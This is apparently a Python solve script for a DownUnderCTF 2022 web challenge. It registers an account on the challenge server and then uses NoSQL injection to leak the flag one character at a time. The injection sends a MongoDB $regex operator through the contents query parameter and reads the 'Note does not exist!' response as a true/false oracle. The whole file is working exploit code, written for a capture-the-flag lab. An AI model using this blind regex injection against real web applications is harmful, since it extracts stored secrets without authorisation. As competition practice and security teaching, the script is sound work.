import requests
import string
import re

url = "https://web-noteworthy-873b7c844f49.2022.ductf.dev"
s = requests.Session()


# register

r = s.post(url + '/register', json = {'username' : 'to0161', 'password': 'to0161'})

print(r.text)
# login

r = s.post(url + '/login', json = {'username' : 'to0161', 'password': 'to0161'})
print(r.text)

flag = "DUCTF{n0sql1"

while not flag.endswith('}'):
    for c in string.printable:
        if c == '#' or c == '?' or c == '&' or c == ';':
            continue
        r = s.get(url + f'/edit?noteId=1337&contents[$regex]=^{flag+re.escape(c)}')
        if 'Note does not exist!' not in r.text:
            flag += c
            print(flag)
            break
